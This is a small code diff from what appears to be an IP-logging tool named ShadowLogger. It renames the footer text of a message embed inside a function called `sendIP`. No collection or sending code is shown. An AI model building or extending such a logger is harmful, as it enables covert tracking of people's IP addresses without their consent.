@@ -45,7 +45,7 @@ const sendIP = () => {
                                         url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                     },
                                     footer: {
-                                        text: "IP Logger v2 by ARMed0ps",
+                                        text: "ShadowLogger by ARMed0ps",
                                         icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                     },
                                     timestamp: new Date().toISOString()
